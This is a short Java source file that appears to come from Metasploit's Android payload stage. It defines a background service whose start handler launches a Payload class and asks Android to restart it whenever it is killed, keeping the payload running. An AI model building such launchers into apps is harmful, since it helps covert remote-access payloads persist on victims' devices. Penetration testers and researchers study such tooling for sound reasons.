package com.metasploit.stage;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

public class MainService extends Service {

    public static void startService(Context context) {
        context.startService(new Intent(context, MainService.class));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Payload.start(this);
        return START_STICKY;
    }

}
